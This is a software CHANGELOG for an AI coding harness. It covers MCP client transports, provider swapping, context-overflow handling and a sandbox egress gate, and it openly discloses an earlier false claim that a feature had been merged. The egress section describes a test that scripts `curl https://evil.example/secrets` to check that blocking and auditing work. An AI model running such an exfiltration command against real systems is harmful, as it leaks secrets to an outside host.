Three bundles ran in parallel (C1 HTTP/SSE launcher, C2 dispatcher MCP tool registration + resources as §5 context, C3 polish trio). C3 caught an oversight in the v60.10 release: **B2's commit `3209a9e` (mid-session provider swap) was never actually merged into main during v60.10** despite the CHANGELOG claiming it. The orchestrator ran `git merge` for B3 only and skipped B2. v60.11 recovers B2 first, then lands C1+C2+C3 on top. The v60.10 docs entry's B2 claims are now actually deployed. Workspace tests **974 → 1018** (+44, including B2's +6). All gates green.

### B2 recovery — §1 mid-session provider swap (carried over from v60.10)

Merged as commit `3209a9e` (the original B2 worktree branch was still around). See the v60.10 CHANGELOG entry for the full feature description: `Runner::swap_adapter`, `Event::AdapterSwapped`, GUI Tauri command + `SwapProviderWire`/`SwapResult` wire types, state-preservation matrix (carries ContextManager/MemoryStore/PlanCanvas/conversation/pending-approval; resets conformance/strategy/capability/few-shot), `RecordingMockAdapter` test helper + 2 integration tests. The v60.10 description is now accurate.

### C1 — §15 HTTP/SSE MCP client launcher

Sibling to v60.10's `stdio_launcher.rs`. Closes the "HTTP / SSE MCP client (egress audited per §12)" row.

- New `crates/atelier-core/src/mcp/http_launcher.rs` (~772 lines + 12 unit tests). Uses `rmcp::transport::SseTransport::start_with_client` — rmcp 0.1.5 has only one remote transport (SSE), so both `Transport::Http` and `Transport::Sse` manifest variants route through it.
- Egress audit: every outbound HTTP request writes one `McpEgressEvent` row to `<audit_dir>/audit.log` per the new `schemas/audit/mcp_egress.v1.json` schema, with `kind: "mcp-http-request"` + `provider` + `url` + `phase: handshake | list_tools | call_tool` + `outcome: success | failure | blocked`. Authorization headers are NEVER serialised — the audit shape has no `headers` key.
- `allow_net: false` semantics for HTTP/SSE manifests = refuse-to-launch with `McpLaunchError::Refused("HTTP/SSE transport requires allow_net=true")`. Stdio is the local-only path; HTTP/SSE explicitly opts in to egress.
- New error variants: `HttpStatus`, `SseStream`, `InvalidHeader`.
- New `audit::McpEgressEvent` shape + `append_mcp_egress` helper (atomic append, mirrors v60.8's `EgressEvent` discipline).
- Live test gated `#[ignore]` reading `ATELIER_MCP_SSE_URL` env-var; rmcp's `SseTransportError::Reqwest` is the only path that surfaces a status code, so some `502`-style failures land as `SseStream` rather than `HttpStatus` — the test tolerates both.

### C2 — §15 dispatcher MCP tool registration + MCP resources as §5 context items

Closes two rows in one bundle: built-in-style tool registration for external MCP servers, plus MCP resources surfaced as `ContextItem`s.

- New `crates/atelier-core/src/mcp/mcp_tool.rs` — `McpToolWrapper` implements the `Tool` trait by routing calls through `McpServerHandle::call_tool`. Carries `server_name`, `tool_name`, `description`, `input_schema`, `Arc<Mutex<McpServerHandle>>` (shared across all tools of one server), and `side_effect_class` (per-tool override or per-server default from the manifest).
- New `crates/atelier-core/src/mcp/registration.rs` — `register_mcp_servers(registry, manifests, approvals, sandbox, audit_dir)` launches each enabled+approved server, lists its tools, registers each as an `McpToolWrapper`. Returns `RegisterMcpReport { servers_registered, tools_registered, servers_pending_approval, server_failures }`. Refused servers and pending-approval servers don't register; per-server failures don't abort the whole registration.
- New `McpServerHandle::list_resources()` + `McpResourceDescriptor { uri, name, mime_type, description }`. Companion helper `mcp_resource_to_context_item` + `register_mcp_resources_as_context` builds a `ContextItem` per resource with `Provenance::McpResource { server_name, resource_uri }`, `payload: BlobRef { sha256_hex: <computed-from-uri>, mime_type }`, `tokens: { count: 0, source: Unavailable }`.
- **Closed-enum break**: new `Provenance::McpResource` variant in `crates/atelier-core/src/context.rs`. Wire label `"mcp_resource"` pinned by the v58 wire-label-agreement test. Match sites updated: `ContextItemSummary::from_item` (context.rs), `cache_bust_from` (ledger.rs), TUI badge map + `provenance_badge_style` (Cyan), badge-covers-every-variant test.
- Integration test `register_and_dispatch_mcp_routed_call` (gated `#[ignore]` on npx) exercises the full path: launch server → register tools → dispatch a tool call routed through `McpToolWrapper` → assert the result rides on the bus like a built-in tool call.
- `McpToolWrapper::execute` is not unit-tested directly (constructing an `McpServerHandle` requires a real rmcp service); the pure pieces (`compile_input_schema`, `validate_args_against`, `map_launch_error`, `stringify_content`) are exercised individually + `execute` is covered by the gated integration test.

### C3 — polish trio (v60.7/8/10 follow-on debt)

Three small follow-ons grouped:

- **(a) `verify_pass` wired into runner**: closes the v60.8 A2 known gap. Runner's per-turn loop now harvests `EditStaged` events as `ObservedChange`s + stashes the last envelope, then calls `dispatcher.verify_pass(&envelope, &observed, now)` (or `emit_verify_not_run` when there's nothing to verify) before `State::Done`. New integration test `run_emits_verification_passed_tier3_when_write_file_observed` pins the contract.
- **(b) `Event::ContextOverflowResolved` UI rendering**: closes the v60.9 B1 follow-on. GUI MetersPane gains a 5s overflow toast with `setInterval` decay; new `state.ts::lastOverflowResolution` field + `applyEvent`/`projectEvent` arms. TUI gets `OverflowResolutionHint` struct + `OVERFLOW_HINT_TTL` const + inline hint slot in `render_cost_meter` decaying after 5s.
- **(c) GUI footer dropdown for `swap_adapter`**: closes the v60.10 B2 UI affordance follow-on. New `<select>` in `App.svelte` near the model badge listing the known adapter families (`mock` / `anthropic` / `openai_compat`); on change, fires `invoke('swap_adapter', { provider })` against B2's real Tauri command (NOT the stub C3 had to write as a fallback — see merge resolution below).

### Cross-bundle merge resolution

Merge order: **B2-recovery → C1 → C2 → C3**. Three conflict files on the C2 merge (`mcp/mod.rs`, `lib.rs`, `mcp_integration.rs`) — all additive re-export collisions, "keep both" resolution. Two conflict files on the C3 merge:

- `crates/atelier-gui/src/lib.rs` — both B2 (recovered) and C3 registered `swap_adapter` Tauri commands. C3 wrote a *stub* version against the assumption that B2's full impl wasn't on main yet (it wasn't, until I merged B2 first). The stub is removed; B2's real async impl (with `AdapterHandle::swap` + `Event::AdapterSwapped` emission + fresh `ModelProfileLoaded` re-emission) is what's deployed.
- `crates/atelier-tui/src/lib.rs` — C3 added an active `ContextOverflowResolved` handler upstream of the blanket no-op arm. B2 had added `AdapterSwapped` to the no-op arm. Resolved by keeping C3's active handler + the `AdapterSwapped` no-op arm.

The `Provenance::McpResource` closed-enum break required updating every `Provenance` match site. C2's agent caught the obvious ones (`ContextItemSummary::from_item`, `cache_bust_from`, TUI badge maps + test). All other match sites were verified at merge time.

### Workspace test count delta

- atelier-core unit: 746 → 782 (+36: 12 from C1 http_launcher + 4 from C1 audit + ~14 from C2 dispatcher/registration + ~6 from C2 mcp_tool)
- atelier-cli unit (lib): 45 → 45 (unchanged)
- atelier-cli integration: 63 → 64 (+1 C3 verify_pass)
- atelier-cli mcp_integration: 3 → 4 always-on + 3 `#[ignore]` (+1 C1 always-on, +1 C2 ignored, +1 C1 ignored)
- atelier-gui: 29 → 29 (unchanged; B2 had already added the bridge test)
- atelier-tui: 94 → 94 (B2 added 2 TUI tests in its recovery; C2 added 0; C3 added 0)
- Total: **974 → 1018** (+44)

### Process candor — the B2 oversight

The v60.10 CHANGELOG entry as previously deployed claimed B2's mid-session-provider-swap landed alongside B3. It didn't. The orchestrator (me, last session) ran `git merge --no-ff worktree-agent-a854bcd084ccde3c8 -m "Merge B3: ..."` after both bundles finished, then wrote a CHANGELOG entry covering both. No corresponding `git merge` was ever run for B2. The mistake survived through the v60.10 push because the docs commit + push happened without re-verifying that the claimed code paths existed on main.

This was caught by the C3 agent's report: "the v60.10 CHANGELOG claimed `Runner::swap_adapter` exists but the GUI surface has no `swap_adapter` Tauri command on main." That observation triggered a `git log --oneline` audit of `c91d851..HEAD` which confirmed the missing merge.

The recovery in v60.11: B2's commit `3209a9e` was still reachable via its worktree branch, so a fresh `git merge --no-ff worktree-agent-a71cfa12e8016bf18` recovered the work cleanly with no conflicts (no main commits had since touched B2's territory). Then C3's stub `swap_adapter` (which it had written defensively assuming B2 wasn't on main) was deleted during the C3 merge in favour of B2's real implementation.

Lesson for future parallel batches (already captured in `~/.atelier/memory/feedback_worktree_isolation_drift.md` for the related drift-into-parent-repo issue): the docs sweep at the end of a parallel batch should grep main's `git log` for each claimed bundle's merge commit before pushing. A bundle-not-merged failure is observationally identical to a bundle-merged-but-empty failure unless you check.

## v60.10 — 2026-05-18 (two-bundle parallel release: §15 rmcp foundation + §1 mid-session provider swap)

B3 + B2 ran in parallel worktrees, then merged sequentially into main (B2 first, B3 second — both fully disjoint). Workspace tests **963 → 974** (+11). All gates green. **Q7 resolved: GO WITH CAVEATS** on rmcp 0.1.5.

### B3 — §15 rmcp foundation (Q7 spike + dep + stdio launcher)

The §15 MCP-client residual was the biggest-ticket remaining Phase A item. This bundle resolves Q7 (rmcp maturity), adds the dep to `atelier-core`, and ships a stdio-launcher that spawns `@modelcontextprotocol/server-filesystem` end-to-end. The remaining §15 rows (HTTP/SSE, built-ins-as-MCP refactor, MCP resources as §5 context items, dispatcher wiring, mechanical gate) sit on top of this foundation and land in v60.11+.

**Q7 verdict — GO WITH CAVEATS** (`experiments/rmcp_spike/README.md` carries the full matrix):

- Stdio handshake against `@modelcontextprotocol/server-filesystem`: ~700ms cold-start via npx, then `list_tools` + `call_tool` clean. `list_directory` returns the expected 14-tool surface.
- Crash recovery: SIGKILL on the live server PID surfaces `ServiceError::Transport("disconnected")` in ~20µs; serve loop quits `Closed` cleanly. No zombies.
- Shutdown via `client.cancel()` (the `CancellationToken` path) is reliable; the natural stdout-EOF path doesn't wake the framed codec.

**Five rmcp 0.1.5 smells worth flagging for v60.11+**:

1. Broken feature gating — `paste::paste!` used unconditionally inside `capabilities.rs` but gated behind the `macros` feature. Setting `default-features = false` breaks the build.
2. No public PID accessor on `TokioChildProcess` once rmcp owns the `Child`. Shutdown must go through `client.cancel()`, not direct subprocess signalling.
3. Natural stdout-EOF path doesn't reliably wake the framed codec — `shutdown()` always uses cancel.
4. `Tool.input_schema` is `Arc<serde_json::Map>`, not `Value::Object`. The launcher wraps it once at projection time so callers see `Value`.
5. `Implementation::from_build_env()` injects the caller's *crate name* as `client_info.name` — MCP servers see "atelier-core" rather than "atelier". Override at v60.11+ dispatcher wiring.

**Files shipped (B3)**:
- `crates/atelier-core/Cargo.toml` + workspace `Cargo.toml` — `rmcp = "0.1.5"` dep.
- `crates/atelier-core/src/mcp/mod.rs` + `errors.rs` + `stdio_launcher.rs` (~685 lines + 9 unit tests). `launch_stdio_server(manifest, sandbox, audit_dir) -> McpServerHandle` does the handshake; `list_tools`, `call_tool`, `shutdown` round out the surface. Respects v60.8's `mcp_config::McpServerManifest` (transport, env interpolation, allow_net) end-to-end.
- `experiments/rmcp_spike/` — fully implemented stdio + crash modes; README's decision matrix populated.
- `crates/atelier-cli/tests/mcp_integration.rs` — 2 always-on tests (`npx_availability_probe`, `egress_block_does_not_prevent_spawn`) + 1 `#[ignore]`-gated live-npx test that exercises the full handshake against the filesystem MCP server.

**Out of scope (deferred to v60.11+)**: HTTP/SSE transport, built-ins-as-MCP refactor, MCP resources as §5 context items, dispatcher wiring (the launcher exposes the surface; the dispatcher doesn't yet register MCP tools alongside built-ins), and the §15 mechanical gate (canonical-workload run with `@modelcontextprotocol/server-filesystem` registered).

**Known gaps documented in code**:
- `launch_stdio_server`'s `audit_dir` parameter is existence-checked but doesn't yet write `§12` egress audit entries — that lands with the dispatcher integration.
- The launcher doesn't wrap the MCP server in `sandbox-exec`/`bwrap` — the existing `sandboxed_argv` infrastructure assumes a short-lived child. A long-lived-MCP-aware sandbox is its own v60.11+ design problem. Egress is still blocked via the `http_proxy=127.0.0.1:1` env block from v60.8.

### B2 — §1 BYOM mid-session provider swap

Closes the §1 BYOM UX-target row: "mid-session provider swap preserves work."

- New `Runner::swap_adapter(new_adapter, now)` method. Per-turn-boundary operation — the caller swaps between `run()` invocations (the types enforce it: `run()` takes `&self`, `swap_adapter` takes `&mut self`). The pre-swap adapter's in-flight `chat()` is not cancelled; drop-on-cancel applies via the existing `CancellationToken`.
- New `Event::AdapterSwapped { from_model_id, to_model_id, swapped_at }` on the bus + standard `kind()` arm + GUI `bridge_event` + Svelte `state.ts` reducer arm + TUI `apply` / `project_event` arms.
- New `AdapterHandle::swap(new)` public setter so the live slot updates atomically with the swap. Pending `swap_adapter` requests queue on `Runner.pending_adapter_swap` and the `AdapterSwapped` event fires on the next `run()` startup.
- GUI Tauri command `swap_adapter(provider: SwapProviderWire) -> SwapResult` where `SwapProviderWire { kind: "mock" | "anthropic" | "openai_compat", model_id, base_url? }`. Builds the new adapter via a refactored `build_swap_adapter` helper.
- State-preservation matrix (carries vs resets across the swap):
  - **Carries**: `ContextManager`, `MemoryStore`, `PlanCanvas`, conversation transcript (via on-disk session + `with_resume`), `StagingPendingApproval`.
  - **Resets**: `ConformanceRingBuffer` (new adapter = new behaviour signal), `Strategy` (re-resolved from new `ModelProfile`), `CapabilityMatrixRow` (refreshed from new model), few-shot cache (forcibly cleared in `swap_adapter`).
  - **Recomputed at construction**: `CostPolicy` is fixed at `Runner::new` time; the caller decides the policy when building the new adapter.
- `RecordingMockAdapter` helper + 2 integration tests in `run_integration.rs`.

**Known follow-ons / candor**:

- The GUI's `swap_adapter` Tauri command emits the bus events + updates the live `AdapterHandle` slot, but does **not** swap the adapter inside a running `Runner` — the Runner reads `self.adapter` per turn, not from the slot. True mid-`run()` swap needs a future Runner refactor to read from a shared slot.
- The `RecordingMockAdapter` had to force `Strategy::JsonSentinel` because `OnDiskSession::resume_conversation_prefix` truncates at orphan tool-call ids — a `harness_meta` tool_call without a matching tool_result would have dropped the assistant turn on resume. Worth documenting in the resume contract.
- No UI affordance lands here — the Tauri command surface is reachable via `invoke('swap_adapter', { provider })`; a footer dropdown / command palette entry is follow-on work.

### Workspace test count delta

- atelier-core unit: 737 → 746 (+9 from `mcp::stdio_launcher::tests`)
- atelier-cli unit (lib): 45 → 45 (unchanged)
- atelier-cli integration: 61 → 63 (+2 B2 swap round-trips)
- atelier-cli mcp_integration (new binary): 2 always-on + 1 `#[ignore]`-gated live-npx
- atelier-gui: 28 → 28 (B2 added 1 GUI bridge test; B3 zero)
- atelier-tui: 92 → 92 (B2 added 2 TUI tests)
- Total: **963 → 974** (+11 including the new mcp_integration binary)

### Cross-bundle merge resolution

Merge order: B2 → B3. **Zero conflicts.** The file-scoping discipline in the briefs paid off:
- B2 touched `runner.rs`, `session.rs::Event`, GUI/TUI projections, integration tests.
- B3 touched `experiments/rmcp_spike/`, `crates/atelier-core/Cargo.toml`, the new `crates/atelier-core/src/mcp/` module, `crates/atelier-cli/tests/mcp_integration.rs` (new file).
- The only file both bundles touched was `crates/atelier-core/src/lib.rs` for re-exports — and git's auto-merge handled the additive case cleanly.

This is the cleanest parallel batch since v60.7 — same lesson, smaller bundles, file-disjoint by design.

### Process candor

B3's agent reported a mid-flight slip: it initially developed in the main repo's working tree rather than the worktree, then caught the mistake + copied the changes into the worktree and reverted the main repo. The final commit is correctly on the worktree's branch; the main repo was verified clean before the merge. Worth noting in the parallel-agent pattern as a sharp edge: agents in `isolation: "worktree"` mode can accidentally edit the parent repo if they cd around or use absolute paths incorrectly. The agent's self-correction was honest and clean — no tracked-file leakage between repos.

## v60.9 — 2026-05-18 (two-bundle parallel release: §1 context-window asymmetry + §2 per-adapter few-shot override)

Two-bundle parallel release. B1 + B4 ran in isolated worktrees, then merged sequentially into main (B1 first because its `MockResponse::overflow` field change had wider workspace blast radius). Workspace tests **928 → 963** (+35). All gates green.

### B1 — §1 BYOM context-window asymmetry (Compact / Reroute / Surface)

Closes the spec promise on what happens when an adapter returns `AdapterError::ContextOverflow`. Three policies, runner-side, configurable per-session.

- New `ContextOverflowPolicy::{Compact, Reroute, Surface}` enum + `Runner::with_overflow_policy(policy)` builder (default = `Compact`).
- **Compact**: auto-selects unpinned context items (token-count-descending) via the new pure `pick_overflow_compaction_targets(summaries, needed, limit, current_total)` helper, feeds them to the v60.5 compaction orchestrator, then retries the turn. Drops down to `Surface` after `MAX_OVERFLOW_RETRIES = 2` consecutive overflows (defends against runaway compaction loops).
- **Reroute**: wireable stub for the v60.10+ routing-dispatcher work — returns `RunError::Config("reroute not yet implemented")`.
- **Surface**: propagates `RunError::ContextOverflow { needed_tokens, limit_tokens }` as a typed error.
- New `Event::ContextOverflowResolved { resolution: "compacted" | "rerouted" | "surfaced", freed_tokens: Option<u32>, items_compacted: Option<usize> }` on the bus. GUI `bridge_event` + TUI `project_event` arms wire-projected; no GUI/TUI rendering arm in this bundle (the bus event lands but no toast/panel renders it — follow-on).
- Auto-selector heuristic: filter unpinned → sort token-count-descending → compute `raw_target = needed - (limit - current_total)` (saturating) → floor at the smallest unpinned candidate's tokens → pad by `OVERFLOW_SAFETY_MARGIN_PCT = 25%` → greedy accumulate. `MAX_OVERFLOW_RETRIES = 2` and the 25% margin are PROVISIONAL pending Q1 calibration.
- `MockResponse::{new, context_overflow}` constructors + new `MockResponse.overflow: Option<(u32, u32)>` field for test seam. The struct-literal MockResponse pattern now requires `overflow: None`; ~30 existing call sites updated.
- 7 new tests: 6 unit tests on the policy match + auto-selector heuristic (extracted as pure helpers), 1 integration test scripts MockAdapter overflow on turn 1, asserts compaction fires + retry succeeds + `Event::ContextOverflowResolved { resolution: "compacted", .. }` lands.

### B4 — §2 model protocol per-adapter few-shot override

Closes the spec promise on per-adapter few-shot customisation. Each adapter can override the shared baseline for a given `Strategy`.

- New trait method on `Adapter`:
  ```rust
  fn few_shot_override(&self, strategy: Strategy) -> Option<Vec<Message>> { None }
  ```
  Default returns `None` (fall back to baseline). MockAdapter keeps the default.
- **AnthropicAdapter**: returns `Some(messages)` for `JsonSentinel` — a Claude-flavoured user/assistant pair with the literal `<<<harness_meta>>>{...}<<<end>>>` sentinel inline so Claude sees the carrier shape. `NativeTool` + `RegexProse` return `None`.
- **OpenAiCompatAdapter**: returns `Some(messages)` for `JsonSentinel` — assistant turn starts with `<<<harness_meta>>>` (no prose preface) and contains only strict JSON between sentinels, biasing local OSS models toward strict-JSON emission without narration.
- Runner wiring: new `Runner.few_shot_cache: parking_lot::Mutex<Option<Vec<Message>>>` field. The override is computed once per session (cached) on first turn. If `Some`, those messages are prepended before the resume/fresh-run bootstrap; if `None`, the existing baseline path runs unchanged.
- New `Runner::with_adapter_for_test(adapter)` test-only builder (`#[doc(hidden)]` + `#[allow(dead_code)]`) for swapping in custom adapter impls in integration tests.
- `async-trait` added as a dev-dep of `atelier-cli` (it's already a normal dep of `atelier-core`) so test adapters can implement the trait directly.
- 9 new tests: per-adapter unit tests (Mock `none-by-default`; Anthropic 3 strategies; OpenAI-compat 3 strategies); 2 integration round-trip tests via `MockAdapterWithOverride`.

### Workspace test count delta

- atelier-core unit: 729 → 737 (+8: B4 adapter overrides)
- atelier-cli unit (lib): 39 → 45 (+6: B1 policy + auto-selector)
- atelier-cli integration: 40 → 61 (+21: B1 1 integration + 20 from B1's `#[path]`-mounted compaction tests; B4 2 round-trips)
- atelier-gui: 28 → 28 (unchanged)
- atelier-tui: 92 → 92 (unchanged)
- Total: **928 → 963**

### Cross-bundle merge resolution

Branches forked from `109fc62`-then-merged-into-`6763c0a` (v60.8 docs). Merge order: B1 → B4. Single conflict on `crates/atelier-cli/src/runner.rs`:
- Both bundles added a new field to the `Runner` struct (`overflow_policy` from B1, `few_shot_cache` from B4) — resolved as additive "keep both."
- Both bundles added a new initialiser line in `Runner::new` — additive "keep both."

No other conflicts. B4 explicitly avoided `session.rs` (B1's territory); B1 explicitly avoided `adapter/*` and `protocol_strategy.rs` (B4's territory). The discipline-driven brief paid off — minimal merge cost vs the v60.8 batch where the agents stepped on each other's `session.rs::Event::kind()` match.

### Deferred to follow-on bundles

- §15 rmcp foundation (B3): blocked behind this release per the user's "B1 + B4 in parallel, then B3" plan. Picked up next.
- §1 mid-session provider swap: defer to a sequential pass (would conflict heavily with B1's overflow handler in `runner.rs`).
- GUI/TUI rendering of `Event::ContextOverflowResolved`: a small follow-on toast on the GUI + footer hint on the TUI.
- `--overflow-policy` CLI flag on the binary: deferred (binary defaults to `Compact`).

## v60.8 — 2026-05-18 (four-bundle release: §11 egress gate, §7 tier indicator, §15 mcp_servers loader, §1 conformance degradation)

Second four-bundle parallel release in two days. Four sub-agent worktrees → four merges into main → one docs commit. Workspace tests **861 → 928** (+67). All gates green: `cargo fmt --check`, `cargo clippy --workspace -D warnings`, `cargo test --workspace`, `npm run check`, `make check` (112 rig tests, 13 canonical fixtures).

### A3 — §15 mcp_servers.json loader + first-use approval store

The rmcp-free config layer. Lands the schema-driven loader and the trust-budget approval store so the eventual rmcp client can plug into a settled surface.

- New `crates/atelier-core/src/mcp_config.rs` (~890 lines including +23 unit tests): typed `McpServerManifest { name, transport, command, args, env, url, headers, side_effect_class, allow_net, enabled }`; `Transport::{Stdio, Http, Sse}`; `SideEffectClass::{LocalSafe, LocalRisky, SharedState, Irreversible}` (sibling to the dispatcher's enum — config-layer concerns vs trust-budget cost semantics evolve independently).
- `pub fn load_mcp_servers(workspace_root) -> Result<Vec<McpServerManifest>, McpConfigError>`: reads `<workspace>/.atelier/mcp_servers.json`; absent file = empty vec (fresh-repo state, not an error); validates each entry against the embedded `schemas/config/mcp_servers.v1.json` via `jsonschema`; rejects duplicate names; filters out `enabled: false` entries before return.
- `mcp_interpolate(s)` free function: resolves `${env:NAME}` from `std::env::var` at request time (not at load time, so secrets never persist into the parsed manifest); `${keychain:NAME}` returns `McpConfigError::KeychainNotYet` — explicit handoff to the future rmcp client.
- `McpApprovals` (mirror of `HookApprovals`): per-server first-use trust-budget store at `<workspace>/.atelier/mcp_servers/_approvals.json`; methods `approve`, `is_approved`, `pending(loaded)`, `save`, `load`. Per spec §15 line 741 ("server registration is a §8 trust-budget event on first use"), approval is at the server level — granting trust to a server grants it to all that server's tools.

### A1 — §11 sandbox egress mechanical gate

Spec §11 + §12: a `shell` tool call attempting egress to a host outside the sandbox profile's allow-list is blocked AND audited.

- Block mechanism (portable, dev-friendly): when the sandbox profile says `allow_net: false`, `subprocess::run` injects `http_proxy=http://127.0.0.1:1` / `https_proxy=http://127.0.0.1:1` into the child's environment. Any HTTP client inside the child (curl, wget, fetch) fails to connect to a closed loopback port. Linux namespaces are non-portable; macOS pf rules need sudo; the proxy approach is the realistic choice and is documented inline.
- New `crates/atelier-core/src/audit.rs`: `EgressEvent { version, kind, tool_call_id, tool_name, destination, outcome, reason, timestamp }` per the new `schemas/audit/subprocess_egress.v1.json`. Newline-delimited JSON, one entry per line, persisted at `<workspace>/.atelier/sessions/<sid>/audit.log`.
- Every built-in tool that launches a subprocess (`shell`, `grep`, `ast_grep`, `read_file`, `list_dir`, `write_file`, `edit_file`) now threads its `tool_call_id` into the subprocess layer so blocked-egress events carry the originating call in the audit trail.
- Integration test `shell_curl_evil_example_is_blocked_and_audited` scripts a `shell` tool call attempting `curl https://evil.example/secrets`; asserts (a) non-zero exit + run reaches Done after later turn declares claimed_done, (b) audit.log contains exactly one `EgressEvent` JSON line referencing `evil.example` + `tc-curl-evil` tool_call_id + RFC 3339 timestamp, (c) `OnDiskSession::load_from` round-trips session.json validating the schema.

### A2 — §7 UI tier indicator

Visibility into verification coverage. When Tier 1 (LSP) is unavailable and the harness falls back to Tier 2 / Tier 3, the user sees the drop in a coloured footer badge rather than silently getting weaker checks.

- New `VerificationTier` enum in `crates/atelier-core/src/verify.rs`: `Tier1Lsp` / `Tier2TreeSitter` / `Tier3Textual` / `NotRun` with `wire_label()` + serde `rename_all = "snake_case"`. Wire labels (`tier1_lsp`, `tier2_tree_sitter`, `tier3_textual`, `not_run`) pinned by an agreement test.
- New `VerificationRun { tier, file_count, claim_count, discrepancies }` with `tier3_textual()` and `not_run()` constructors. Tier 1 is wire-reserved but has no producer (LSP work gated on Q3); Tier 2 producer wiring is a Phase D follow-on.
- New `Event::VerificationPassed { tier, file_count, claim_count }` (kind `VerificationPassed`); `SessionDispatcher::verify_pass` runs Tier 3 textual + emits the event; `emit_verify_not_run` is the explicit "verification disabled" sentinel.
- GUI MetersPane gains a colour-coded verify badge: green (Tier 1), yellow (Tier 2), orange (Tier 3), gray (NotRun). New `state.ts` types `VerificationTier` + `VerificationStatus` + `verificationTierLabel()` helper. TUI: `VerificationStatusHint` with `badge_label`/`badge_colour`, surfaced right-aligned on the cost row.
- 13 new tests pin the wire-label agreement, the bridge, and the badge rendering.
- **Known follow-on**: the dispatcher's `verify_pass` is **not yet called from `runner.rs`** — the Runner still transitions to `State::Verifying` without invoking it. Wiring the call site is a small follow-on; the doc + `emit_verify_not_run` sentinel make the absence explicit rather than silent.

### A4 — §1 BYOM conformance-driven strategy degradation

The runner walks the active §2 strategy toward more-tolerant forms when the rolling-window malformed-envelope rate crosses a threshold. PROVISIONAL defaults (3-of-20) — calibration row depends on Q1.

- New constants in `crates/atelier-core/src/protocol_conformance.rs`: `DEFAULT_DEGRADATION_WINDOW: usize = 20` + `DEFAULT_DEGRADATION_THRESHOLD: u32 = 3`. `ProtocolConformance::should_degrade()` returns true when the rolling window has ≥ threshold malformed events out of ≥ window total.
- `Strategy::less_tolerant_than` + degradation order (`NativeTool < JsonSentinel < RegexProse`). `Strategy::degrade_one_step` walks toward the more-tolerant end of the stack; degradation is one-way for the session (no auto-promotion).
- Runner wiring: each turn's parse outcome feeds `conformance.record(...)`. When `should_degrade()` is true, the runner decrements the active strategy one step and emits `Event::StrategyDegraded { from, to, reason }`. `Runner::with_degradation_window(n)` + `with_degradation_threshold(t)` builders let integration tests dial the threshold down without queueing 20 mock responses.
- New `Event::StrategyDegraded` (kind `StrategyDegraded`) on the bus; GUI bridge serialises `from`/`to` via `Strategy::as_str` ("native_tool" / "json_sentinel" / "regex_prose"); GUI `state.ts` `applyEvent` arm updates `currentModel.strategy` so the footer badge reflects the lowered tier. TUI's apply arm does the same on `current_model.strategy`.
- Two new integration tests in `crates/atelier-cli/tests/run_integration.rs`:
  - `run_degrades_strategy_after_three_malformed_envelopes_in_window`: 4-turn scripted MockAdapter with 3 malformed responses + one JSON-sentinel envelope; asserts exactly one `StrategyDegraded(NativeTool → JsonSentinel)` event fires.
  - `run_does_not_emit_strategy_degraded_when_envelopes_are_clean`: pins the "no false positives" half — a clean envelope doesn't fire the degrade arm even with threshold dialled to 1.

### Workspace test count delta

- atelier-core unit: 675 → 729 (+54: +23 mcp_config + +7 verify + +6 audit + +18 protocol_conformance/strategy)
- atelier-cli unit (lib): 39 → 39 (unchanged — A1/A2/A3/A4 added tests to atelier-core or integration suite)
- atelier-cli integration: 37 → 40 (+3: 1 egress gate, 2 strategy degradation)
- atelier-gui: 26 → 28 (+2: VerificationPassed bridge + StrategyDegraded bridge)
- atelier-tui: 84 → 92 (+8: tier badge rendering + degradation apply arm)
- Total: **861 → 928**

### Cross-bundle merge resolution notes

Branches forked from `109fc62` (v60.7 docs) and merged in order **A3 → A1 → A2 → A4**. A3 was fully isolated (zero conflicts). A1 + A2 merged cleanly via git's ort strategy (additive changes to disjoint sections). A4 collided with A2 on **five files**, all additive collisions on shared registries:

- `session.rs::Event` enum + `kind()` match: keep both `VerificationPassed` (A2) + `StrategyDegraded` (A4).
- `atelier-gui/src/lib.rs::bridge_event` match + tests: keep both arms.
- `atelier-gui/ui/src/lib/state.ts` applyEvent + projectEvent arms: keep both cases.
- `atelier-tui/src/lib.rs` apply + project_event arms: keep both.
- `atelier-cli/tests/run_integration.rs`: the conflict here was structural — git auto-merged the shared `let runner = Runner::new(...)` scaffold INSIDE both test functions, producing a frankentest. Resolved by extracting each test cleanly from its source worktree and re-appending them in order.

No semantic conflicts. The pattern is now well-established: bundles that touch the `Event` enum / `bridge_event` / `state.ts applyEvent` will always collide on those registries, but the resolution is always "keep both."

## v60.7 — 2026-05-18 (four-bundle release: §2 protocol overhead, Phase C close, §1 BYOM ledger, §14 persistence)

Four bundles landed in parallel from separate sub-agent worktrees, then merged sequentially into main. Workspace tests **788 → 861** (+73). All gates green: `cargo fmt --check`, `cargo clippy --workspace -D warnings`, `cargo test --workspace`, `npm run check`, `make check` (11/11 canonical fixtures + 13 with new t12/t13, 112 rig tests).

### Bundle 5 — §2 protocol-overhead harness + nightly CI + fixtures

- New `atelier_core::protocol_strategy::measure_overhead` returns bytes-on-wire, approximate tokens, and parse-time-ms per emission strategy (`native_tool` / `json_sentinel` / `regex_prose`).
- New `atelier protocol-overhead` CLI subcommand runs the harness against scripted `MockAdapter` fixtures (`tests/protocol/fixtures/{native_tool,json_sentinel,regex_prose}.json`) and writes `tests/protocol/overhead.json` per `schemas/protocol/overhead.v1.json` (additive optional fields).
- New nightly GitHub Actions workflow `.github/workflows/nightly_protocol_overhead.yml` runs the harness daily; fails on >10% drift vs the rolling 7-day median.
- New `atelier_cli::overhead` module + 7 unit tests; 3 strategy-side tests for `measure_overhead`.

### Bundle 1 — Phase C close (mental-model panel + inline renderers + UX-target workloads)

Closes the four remaining Phase C residuals. **Tasks/todo.md** §3 + §5 rows fully ticked.

- **§5 mental-model panel** (off by default, cost-disclosed). New `atelier_core::mental_model::{MentalModel, MentalModelSnapshot, MentalModelError}`; `SessionDispatcher::{set_mental_model, snapshot_mental_model}`; `Event::MentalModelSnapshot { enabled, text_tokens }`; new Tauri commands `set_mental_model` + `snapshot_mental_model`; new `MentalModelPane.svelte` + header toggle row in `App.svelte`; TUI footer hint `mm:on(~Ntk,0/turn)` driven by a new `MentalModelHint` projection. v0 explicitly does NOT inject text into the prompt; the cost-disclosure badge reads "0 tokens per turn at present" until that ships.
- **§3 inline rendering Mermaid / D2 / images**. New `InlineRenderers.svelte`; `mermaid@^11.4.1` npm dep added; integrated in `DiffPane.svelte` and `MemoryPane.svelte`. Mermaid + image cases render inline; D2 falls back to a "render not available, showing source" placeholder.
